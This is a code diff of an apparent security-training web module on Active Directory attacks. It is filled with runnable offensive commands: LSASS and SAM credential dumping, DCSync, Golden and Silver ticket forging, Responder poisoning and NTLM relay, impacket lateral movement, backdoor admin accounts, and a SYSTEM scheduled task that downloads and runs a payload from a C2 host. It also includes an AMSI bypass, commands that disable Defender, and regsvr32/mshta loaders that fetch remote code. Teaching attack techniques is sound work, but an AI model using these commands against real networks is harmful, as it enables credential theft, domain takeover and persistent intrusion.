-# Mimikatz — export all tickets from memory:
+# 3. Meterpreter hashdump:
+meterpreter> hashdump
+meterpreter> run post/multi/recon/local_exploit_suggester
+
+# 4. Registry SAM backup (local admin):
+reg save HKLM\SAM C:\sam.bak
+reg save HKLM\SYSTEM C:\system.bak
+# Transfer to Kali, then:
+python3 secretsdump.py -sam sam.bak -system system.bak LOCAL`}</Pre>
+
+        <H>Pass-the-Ticket</H>
+        <Pre label="// PASS-THE-TICKET — USE KERBEROS TICKETS">{`# Export tickets with Mimikatz:
 sekurlsa::tickets /export
-# Creates .kirbi files for each ticket
+# Creates .kirbi files
 
-# Import a ticket:
+# Import and use a ticket:
 kerberos::ptt ticket.kirbi
 
-# Rubeus — list tickets:
-rubeus.exe triage
+# Rubeus — list active tickets:
+.\rubeus.exe triage
 
-# Rubeus — export tickets:
-rubeus.exe dump /luid:0x3e4 /service:krbtgt
+# Rubeus — dump tickets:
+.\rubeus.exe dump /luid:0x3e4 /service:krbtgt
 
-# Rubeus — import and use ticket:
-rubeus.exe ptt /ticket:base64_ticket
+# Rubeus — inject ticket:
+.\rubeus.exe ptt /ticket:BASE64_TICKET_HERE
 
-# Linux — use ticket with impacket:
+# Linux — use Kerberos ticket with impacket:
 export KRB5CCNAME=/path/to/ticket.ccache
 python3 psexec.py -k -no-pass domain/admin@server.domain.local`}</Pre>
+      </div>
+    ),
+    takeaways: [
+      'NTLM hashes can authenticate directly — cracking is optional, not required for lateral movement',
+      'CrackMapExec is the fastest way to test a hash across an entire subnet simultaneously',
+      'WMIExec is stealthier than PSExec — it does not create a service entry or drop files',
+      'Kerberos tickets can be extracted from memory and injected into other sessions (Pass-the-Ticket)',
+    ]
+  },
 
-      <H2>07 — DCSync: Dumping the Domain</H2>
-      <P>DCSync abuses the replication rights in Active Directory. Domain Controllers replicate data between each other using the Directory Replication Service (DRS) protocol. Any account with replication rights (usually only DCs and Domain Admins) can request this data — including password hashes for ALL users including krbtgt.</P>
+  {
+    id: 'ad-ch5',
+    title: 'DCSync & Credential Dumping',
+    difficulty: 'ADVANCED',
+    readTime: '15 min',
+    labLink: '/modules/active-directory/lab',
+    content: (
+      <div>
+        <P>DCSync abuses Active Directory's replication protocol. Domain Controllers replicate the NTDS.dit database between each other. Any account with DS-Replication rights can trigger this replication and request password hashes for any domain user — including the krbtgt account.</P>
 
-      <Pre label="// DCSYNC — DUMP ALL DOMAIN HASHES">{`# Requirements: 
-# Account must have DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights
-# Default: Domain Admins, Enterprise Admins, SYSTEM on DCs
+        <H>DCSync Attack</H>
+        <Pre label="// DCSYNC — DUMP ALL DOMAIN HASHES">{`# Requirements: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
+# Default holders: Domain Admins, Enterprise Admins, DCs
 
-# Mimikatz DCSync:
+# Mimikatz DCSync (from a domain-joined Windows host):
 lsadump::dcsync /user:krbtgt                  # dump krbtgt hash
 lsadump::dcsync /user:Administrator           # dump admin hash
 lsadump::dcsync /domain:domain.local /all     # dump ALL hashes
 
-# Impacket secretsdump (from Kali — no need for Mimikatz):
-python3 secretsdump.py domain.local/admin:password@DC_IP
+# Impacket secretsdump (from Kali — no Mimikatz needed):
+python3 secretsdump.py domain.local/admin:Password@DC_IP
 python3 secretsdump.py -hashes :NTLM_HASH domain.local/admin@DC_IP
 
-# Output:
+# Output format:
 # [*] Dumping Domain Credentials (domain/uid:rid:lmhash:nthash)
 # Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
 # krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
-# Why krbtgt hash is the holy grail:
-# → Can create Golden Tickets (forge ANY TGT for ANY user, any lifetime)
-# → Golden Ticket survives password changes until krbtgt reset twice
-# → Domain-level persistence that lasts months/years`}</Pre>
+# The krbtgt hash is the holy grail:
+# - Create Golden Tickets for ANY user
+# - Golden Tickets survive password resets until krbtgt is reset TWICE
+# - Domain persistence that can last months or years`}</Pre>
 
-      <H2>08 — Golden & Silver Tickets</H2>
-      <Pre label="// GOLDEN TICKET — FORGE ANY TGT WITH KRBTGT HASH">{`# Requirements: krbtgt hash (from DCSync)
-# Result: forge TGT for ANY user, ANY group, ANY lifetime
+        <H>LSASS Memory Dumping</H>
+        <Pre label="// DUMP LSASS — LOCAL CREDENTIAL EXTRACTION">{`# Method 1: Task Manager (GUI — if admin)
+# Right-click lsass.exe → Create dump file
+# Produces: C:\Windows\Temp\lsass.DMP
 
-# Collect needed info:
-# krbtgt hash: from DCSync
-# Domain SID: whoami /user → remove last -RID
-# Domain name: domain.local
+# Method 2: comsvcs.dll (built-in, no extra tools):
+# Get LSASS PID first:
+Get-Process lsass | select Id
+tasklist | findstr lsass
 
-# Mimikatz — create Golden Ticket:
+# Create dump via rundll32:
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump LSASS_PID C:\lsass.dmp full
+
+# Method 3: ProcDump (Sysinternals — signed, less flagged):
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# Parse dump on Kali with pypykatz:
+pip install pypykatz
+pypykatz lsa minidump lsass.dmp
+
+# Or transfer to Windows and parse with Mimikatz:
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords`}</Pre>
+
+        <Note label="CRITICAL">DCSync generates event ID 4662 (Directory Service Access) on the DC. LSASS dumps generate event ID 10 from Sysmon if deployed. Both are high-confidence indicators of compromise — defenders monitoring for these will know you are there within minutes. In authorized engagements, confirm scope before running these.</Note>
+      </div>
+    ),
+    takeaways: [
+      'DCSync requires DS-Replication rights — typically only Domain Admins and Enterprise Admins have these by default',
+      'secretsdump.py from Kali performs DCSync remotely without needing Mimikatz on the target',
+      'The krbtgt hash is the most valuable output — it enables Golden Ticket persistence',
+      'LSASS dumps can be created using only built-in Windows tools (comsvcs.dll + rundll32)',
+    ]
+  },
+
+  {
+    id: 'ad-ch6',
+    title: 'Golden & Silver Tickets',
+    difficulty: 'ADVANCED',
+    readTime: '15 min',
+    labLink: '/modules/active-directory/lab',
+    content: (
+      <div>
+        <P>Once you have the krbtgt hash from DCSync, you can forge Kerberos tickets for any user in the domain with any group membership, valid for any time period. This is the pinnacle of Active Directory compromise — complete, persistent, domain-level control.</P>
+
+        <H>Golden Ticket</H>
+        <Pre label="// GOLDEN TICKET — FORGE TGT WITH KRBTGT HASH">{`# Requirements:
+# - krbtgt NTLM hash (from DCSync)
+# - Domain SID (from: whoami /user — remove last -RID section)
+# - Domain name
+
+# Get domain SID:
+whoami /user
+# Output: DOMAIN\admin S-1-5-21-3623811015-3361044348-30300820-1013
+# SID without last part: S-1-5-21-3623811015-3361044348-30300820
+
+# Mimikatz — create and inject Golden Ticket:
 kerberos::golden /user:FakeAdmin /domain:domain.local \
   /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
 
-# This creates a TGT for a user that doesn't exist
+# This forges a TGT for a non-existent user
 # with Domain Admin group membership
 # valid for 10 years by default
 
-# Impacket — create Golden Ticket:
+# Impacket — create Golden Ticket file:
 python3 ticketer.py -nthash KRBTGT_HASH \
   -domain-sid S-1-5-21-... \
   -domain domain.local FakeAdmin
 
+# Use the ticket:
 export KRB5CCNAME=FakeAdmin.ccache
-python3 psexec.py -k -no-pass domain.local/FakeAdmin@dc.domain.local`}</Pre>
+python3 psexec.py -k -no-pass domain.local/FakeAdmin@dc.domain.local
 
-      <Pre label="// SILVER TICKET — FORGE TGS FOR SPECIFIC SERVICE">{`# Silver Ticket = forge TGS using SERVICE ACCOUNT hash
-# More stealthy than Golden (doesn't touch DC)
-# Can forge tickets for: CIFS, HOST, HTTP, LDAP, MSSQL
+# Key property: survives password resets
+# krbtgt must be reset TWICE to invalidate Golden Tickets
+# This makes Golden Tickets an extremely persistent backdoor`}</Pre>
 
-# Requires: service account NTLM hash, domain SID, service SPN
+        <H>Silver Ticket</H>
+        <Pre label="// SILVER TICKET — FORGE TGS FOR SPECIFIC SERVICE">{`# Silver Ticket = forge TGS using a SERVICE ACCOUNT hash
+# More stealthy than Golden (never touches DC during use)
+# Target services: CIFS, HOST, HTTP, LDAP, MSSQL
+
+# Requirements: service account NTLM hash, domain SID, target SPN
 
 # Mimikatz — Silver Ticket for CIFS (file shares):
 kerberos::golden /user:Administrator /domain:domain.local \
   /sid:S-1-5-21-... /target:fileserver.domain.local \
   /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt
 
-# Now access file shares on fileserver as Administrator:
-dir \\fileserver\c$`}</Pre>
+# Access file shares as Administrator:
+dir \\fileserver\c$
 
-      <H2>09 — LLMNR/NBT-NS Poisoning</H2>
-      <Pre label="// RESPONDER — CAPTURE NTLM HASHES ON THE NETWORK">{`# When a Windows host can't resolve a name via DNS,
-# it falls back to LLMNR/NBT-NS broadcast queries.
-# Responder answers these, claiming to be the target,
-# and Windows sends NTLM authentication.
+# Silver Ticket for SQL Server:
+kerberos::golden /user:Administrator /domain:domain.local \
+  /sid:S-1-5-21-... /target:sqlserver.domain.local \
+  /service:MSSQLSvc /rc4:SERVICE_ACCOUNT_HASH /ptt
 
-# Start Responder (capture mode):
+# Why Silver is stealthier:
+# - Never communicates with DC (no AS-REQ/TGS-REQ)
+# - Only the target service validates the ticket
+# - Much harder to detect without endpoint logging`}</Pre>
+
+        <Note label="NOTE">The difference: Golden Ticket = forge a TGT using krbtgt hash (affects whole domain). Silver Ticket = forge a TGS using a service account hash (affects only that service). Golden Tickets are more powerful. Silver Tickets are more stealthy.</Note>
+      </div>
+    ),
+    takeaways: [
+      'Golden Tickets forge TGTs using the krbtgt hash — granting access to any resource in the domain',
+      'Golden Tickets survive password changes until krbtgt is reset twice — persistent domain compromise',
+      'Silver Tickets target a specific service and never touch the DC — significantly stealthier',
+      'Both ticket types can be used from Linux with impacket by setting the KRB5CCNAME environment variable',
+    ]
+  },
+
+  {
+    id: 'ad-ch7',
+    title: 'LLMNR Poisoning & SMB Relay',
+    difficulty: 'INTERMEDIATE',
+    readTime: '15 min',
+    labLink: '/modules/active-directory/lab',
+    content: (
+      <div>
+        <P>When Windows cannot resolve a hostname via DNS, it falls back to LLMNR and NBT-NS — broadcast protocols that ask the entire local network "who has this hostname?" Any machine on the network can respond. Responder does exactly that, poisoning these requests to capture NTLM authentication attempts.</P>
+
+        <H>Responder — LLMNR/NBT-NS Poisoning</H>
+        <Pre label="// RESPONDER — CAPTURE NTLM HASHES">{`# Start Responder in capture mode:
 sudo python3 Responder.py -I eth0 -rdwv
 
 # Flags:
-# -r  Enable answers for MSSQL
-# -d  Enable DHCP poisoning
-# -w  Start WPAD rogue server (captures proxy auth)
+# -r  Answers for MSSQL/WinRM (Windows Remote Management)
+# -d  DHCP poisoning (rare, dangerous on prod networks)
+# -w  WPAD rogue proxy (captures proxy auth credentials)
+# -v  Verbose output
 
-# Captured hashes saved to:
+# Captured hashes saved automatically to:
 ls /usr/share/responder/logs/
+# Files: SMB-NTLMv2-SSP-192.168.1.50.txt, etc.
 
-# Crack NTLMv2 hashes:
+# Crack NTLMv2 hashes (mode 5600):
 hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
 
-# Analysis mode (passive — no poisoning):
-sudo python3 Responder.py -I eth0 -A
+# Analysis/passive mode (no poisoning — just watch):
+sudo python3 Responder.py -I eth0 -A`}</Pre>
 
-# OPSEC: Responder is VERY noisy
-# Every analyst on the network will see broadcast answers
-# Use carefully in red team engagements`}</Pre>
-
-      <H2>10 — SMB Relay Attacks</H2>
-      <Pre label="// NTLM RELAY — RELAY CAPTURED AUTH TO ANOTHER HOST">{`# Instead of cracking the NTLM hash, RELAY it to another host
-# Requirements: SMB signing must be DISABLED on target
-
-# Step 1: Check which hosts have SMB signing disabled:
+        <H>SMB Relay Attack</H>
+        <P>Instead of capturing and cracking NTLM hashes, relay them in real-time to another host. If the relayed credential has local admin rights on the target, you get full access — no cracking required.</P>
+        <Pre label="// NTLM RELAY — STEP BY STEP">{`# Step 1: Find hosts with SMB signing disabled (relay targets):
 cme smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
 
-# Step 2: Disable SMB and HTTP in Responder (we're relaying, not capturing):
-nano /usr/share/responder/Responder.conf
+# Step 2: Disable SMB + HTTP in Responder (we relay, not capture):
+# Edit /usr/share/responder/Responder.conf:
 # SMB = Off
 # HTTP = Off
 
-# Step 3: Start ntlmrelayx targeting vulnerable hosts:
+# Step 3: Start ntlmrelayx pointing at targets:
 python3 ntlmrelayx.py -tf relay_targets.txt -smb2support
 
-# Step 4: Start Responder:
+# Step 4: Start Responder to capture and forward:
 sudo python3 Responder.py -I eth0 -rdwv
 
-# When a machine tries to authenticate to us,
-# we relay to targets in relay_targets.txt
-# If relayed user is local admin → get SAM dump automatically
+# When any machine on the network attempts to authenticate,
+# ntlmrelayx relays that credential to the relay targets.
+# If successful with local admin rights -> auto-dumps SAM hashes.
 
-# Advanced: relay to get shell:
+# Get interactive shell on successful relay:
 python3 ntlmrelayx.py -tf relay_targets.txt -smb2support -i
-# Opens interactive shell on successful relay
 
-# Relay to LDAP (requires signing disabled on DC — rare):
+# Relay to LDAP for adding DCSync rights to a user:
 python3 ntlmrelayx.py -t ldap://DC_IP --delegate-access`}</Pre>
 
-      <H2>11 — Lateral Movement with Impacket</H2>
-      <Pre label="// IMPACKET SUITE — COMPLETE WINDOWS REMOTE EXECUTION">{`# Install impacket:
-pip install impacket
-# or: git clone https://github.com/fortra/impacket && pip install -e .
+        <Note label="OPSEC NOTE">Responder is extremely noisy on the network — every LLMNR/NBT-NS broadcast is answered with your IP. Network analysts and IDS will see this immediately. In authorized engagements, use -A (analysis mode) first to understand how noisy the environment is, then switch to active mode if stealth is not required.</Note>
+      </div>
+    ),
+    takeaways: [
+      'LLMNR/NBT-NS poisoning works because Windows broadcasts name resolution requests on the local network',
+      'SMB signing disabled = SMB relay possible. CrackMapExec --gen-relay-list finds all vulnerable targets',
+      'NTLM relay does not require cracking — it reuses the credential in real-time against another target',
+      'Responder is loud — every broadcast gets answered. Use analysis mode (-A) first to assess risk',
+    ]
+  },
 
-# PSExec — creates and runs service (leaves artifacts):
-python3 psexec.py domain.local/admin:password@TARGET
+  {
+    id: 'ad-ch8',
+    title: 'Lateral Movement & Persistence',
+    difficulty: 'ADVANCED',
+    readTime: '18 min',
+    labLink: '/modules/active-directory/lab',
+    content: (
+      <div>
+        <P>Owning a single host is the start, not the finish. Lateral movement is the art of expanding access across the network using credentials and trust relationships gained from the initial foothold. Persistence ensures you maintain access even after reboots, password changes, and incident response.</P>
+
+        <H>Impacket Suite for Lateral Movement</H>
+        <Pre label="// IMPACKET — REMOTE EXECUTION METHODS">{`# PSExec — creates a service (admin required, noisy, leaves logs):
+python3 psexec.py domain.local/admin:Password@TARGET
 python3 psexec.py -hashes :NTLM_HASH domain.local/admin@TARGET
 
-# WMIExec — uses WMI (no service created, stealthier):
-python3 wmiexec.py domain.local/admin:password@TARGET
+# WMIExec — uses WMI (no service, stealthier):
+python3 wmiexec.py domain.local/admin:Password@TARGET
 python3 wmiexec.py -hashes :NTLM_HASH domain.local/admin@TARGET "whoami"
 
-# SMBExec — executes via SMB service (no file drop):
-python3 smbexec.py domain.local/admin:password@TARGET
+# SMBExec — SMB pipe execution (no file written to disk):
+python3 smbexec.py domain.local/admin:Password@TARGET
 
-# ATExec — uses Windows Task Scheduler:
-python3 atexec.py domain.local/admin:password@TARGET "command"
+# ATExec — Windows Task Scheduler:
+python3 atexec.py domain.local/admin:Password@TARGET "whoami"
 
-# SecretsDump — dump credentials remotely:
-python3 secretsdump.py domain.local/admin:password@TARGET
+# SecretsDump — dump credentials remotely (requires admin):
+python3 secretsdump.py domain.local/admin:Password@TARGET
 
-# GetST — request service ticket for Kerberos delegation:
-python3 getST.py -spn cifs/target.domain.local domain.local/user:pass
+# Stealth ranking (most stealthy first):
+# ATExec > WMIExec > SMBExec > PSExec`}</Pre>
 
-# Ticketer — create Golden/Silver tickets:
-python3 ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain domain.local user
-
-# Scan for SMB vulnerabilities:
-python3 smbclient.py domain.local/admin:pass@TARGET
-shares  # list shares
-use C$  # connect to C drive
-ls      # list files`}</Pre>
-
-      <H2>12 — Persistence: Backdoor Accounts</H2>
-      <Pre label="// CREATING PERSISTENCE IN AD ENVIRONMENTS">{`# Add backdoor local admin (on compromised host):
+        <H>Persistence Techniques</H>
+        <Pre label="// PERSISTENCE — SURVIVE REBOOTS AND IR">{`# Add local backdoor admin (on compromised host):
 net user backdoor Password123! /add
 net localgroup administrators backdoor /add
 
-# Add domain user (requires Domain Admin):
+# Add domain user and elevate (requires Domain Admin):
 net user backdoor Password123! /add /domain
 net group "Domain Admins" backdoor /add /domain
 
-# Create scheduled task (persistence on host):
-schtasks /create /tn "WindowsUpdate" /tr "powershell -WindowStyle Hidden -c 'IEX(...)'" \
+# Scheduled task (runs as SYSTEM on logon):
+schtasks /create /tn "WindowsUpdate" \
+  /tr "powershell -WindowStyle Hidden -ep bypass -c 'IEX(New-Object Net.WebClient).downloadString(\"http://C2_IP/payload.ps1\")'" \
   /sc onlogon /ru SYSTEM
 
-# Modify existing service binary path:
-sc config ServiceName binpath= "C:\backdoor.exe"
+# Registry run key (runs on user logon):
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
+  /v "WindowsUpdate" /t REG_SZ /d "C:\backdoor.exe"
 
-# Add registry run key:
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run \
-  /v Update /t REG_SZ /d "C:\backdoor.exe"
-
-# WMI subscription (fileless persistence):
-# Runs command when event occurs (e.g. every minute)
-$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter ...
-
-# DCSync rights without Domain Admin (stealthy persistence):
-# Add replication rights to a regular user → can run DCSync forever
-# Without being in Domain Admins group
+# DCSync rights backdoor (high-value, stealthy persistence):
+# Grant replication rights to a regular user
+# They can now DCSync without being in Domain Admins
 Add-ObjectAcl -TargetDistinguishedName "DC=domain,DC=local" \
-  -PrincipalIdentity backdoor \
-  -Rights DCSync`}</Pre>
+  -PrincipalIdentity backdoor -Rights DCSync`}</Pre>
 
-      <H2>13 — Defence Evasion in AD Environments</H2>
-      <Pre label="// BYPASS COMMON DEFENCES">{`# AMSI Bypass (blocks PowerShell script scanning):
+        <H>Defence Evasion</H>
+        <Pre label="// EVADING COMMON WINDOWS DEFENCES">{`# AMSI bypass (disables PowerShell script scanning):
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-# Or:
-sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ([TYpE]( "{1}{0}"-F'F','rE' ) )
 
-# AMSI bypass (one-liner):
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b.GetFields('NonPublic,Static');Foreach($d in $c) {if ($d.Name -like "*Context") {$d.SetValue($null,[IntPtr]32)}}}};
-
-# PowerShell execution policy bypass:
+# Execution policy bypass:
 powershell -ExecutionPolicy Bypass -File script.ps1
-powershell -ep bypass
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted
+powershell -ep bypass -c "IEX(...)"
 
-# CLM bypass (Constrained Language Mode):
-# Run PowerShell in a COM object
-$sh = New-Object -ComObject WScript.Shell
-$sh.Run("powershell -ep bypass -c '...'")
-
-# Defender exclusion (if admin):
-Add-MpPreference -ExclusionPath "C:\Users\Public\"
+# Disable Defender real-time protection (requires admin):
 Set-MpPreference -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionPath "C:\Users\Public\"
 
-# Use signed LOLBins for execution:
-# regsvr32, mshta, wscript, cscript, certutil, msiexec
-certutil -decode encoded.txt payload.exe
-mshta javascript:a=(GetObject('script:http://LHOST/payload.sct')).Exec();close();`}</Pre>
+# LOLBins — use signed binaries for execution:
+certutil -decode encoded.b64 payload.exe
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""payload.exe"" :close")
+regsvr32 /u /s /i:http://C2_IP/payload.sct scrobj.dll`}</Pre>
 
-      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #1a2e1e' }}>
-        <div style={{ background: 'rgba(255,65,54,0.04)', border: '1px solid rgba(255,65,54,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
-          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a1a1a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
-          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', color: '#ff4136', marginBottom: '0.5rem', fontWeight: 600 }}>MOD-05 Interactive Lab</div>
-          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a', marginBottom: '1.5rem' }}>5 steps &middot; 145 XP &middot; Real commands &middot; Flag captures</div>
-          <Link href="/modules/active-directory/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', color: '#ff4136', padding: '12px 32px', border: '1px solid rgba(255,65,54,0.6)', borderRadius: '6px', background: 'rgba(255,65,54,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(255,65,54,0.15)', display: 'inline-block' }}>
-            LAUNCH LAB &#8594;
-          </Link>
+        <Note label="CRITICAL">Adding accounts to Domain Admins is the loudest possible persistence method — it generates event ID 4728 and will alert any SOC that has basic monitoring. DCSync-rights backdoor is far stealthier: a regular-looking user account that can silently replicate the entire domain database. Defenders rarely audit replication ACLs.</Note>
+      </div>
+    ),
+    takeaways: [
+      'WMIExec and SMBExec are stealthier than PSExec — they do not create a service entry on the target',
+      'DCSync rights granted to a regular account is the stealthiest persistence technique — rarely detected',
+      'Scheduled tasks running as SYSTEM persist across password changes and many incident response actions',
+      'AMSI bypass is essential before running offensive PowerShell — it disables script content inspection',
+    ]
+  },
+]
+
+export default function ActiveDirectoryModule() {
+  return (
+    <div>
+      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a4a4a' }}>
+        <Link href="/" style={{ color: '#5a4a4a', textDecoration: 'none' }}>GHOSTNET</Link>
+        <span>›</span>
+        <Link href="/modules/active-directory" style={{ color: '#5a4a4a', textDecoration: 'none' }}>ACTIVE DIRECTORY ATTACKS</Link>
+        <span>›</span>
+        <span style={{ color: accent }}>CONCEPT</span>
+        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
+          <Link href="/modules/active-directory/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.5)', borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB &#8594;</Link>
         </div>
+      </div>
+
+      <div style={{ marginBottom: '2.5rem' }}>
+        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a4a4a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MOD-05 · ADVANCED MODULE</div>
+        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: '0 0 20px rgba(255,65,54,0.35)' }}>ACTIVE DIRECTORY ATTACKS</h1>
+        <p style={{ color: '#6a5a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', lineHeight: 1.6 }}>
+          Architecture · BloodHound · Kerberoasting · AS-REP Roasting · Pass-the-Hash · DCSync · Golden Tickets · LLMNR · SMB Relay · Lateral Movement
+        </p>
+      </div>
+
+      <ModuleCodex moduleId="active-directory" accent={accent} chapters={chapters} />
+
+      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #1a0808' }}>
         <div style={{ display: 'flex', justifyContent: 'space-between' }}>
-          <Link href="/modules/offensive" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>&#8592; MOD-04: OFFENSIVE</Link>
-          <Link href="/modules/web-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>MOD-06: WEB ATTACKS &#8594;</Link>
+          <Link href="/modules/offensive" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a3a3a' }}>&#8592; MOD-04: OFFENSIVE</Link>
+          <Link href="/modules/web-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a3a3a' }}>MOD-06: WEB ATTACKS &#8594;</Link>
         </div>
       </div>
     </div>
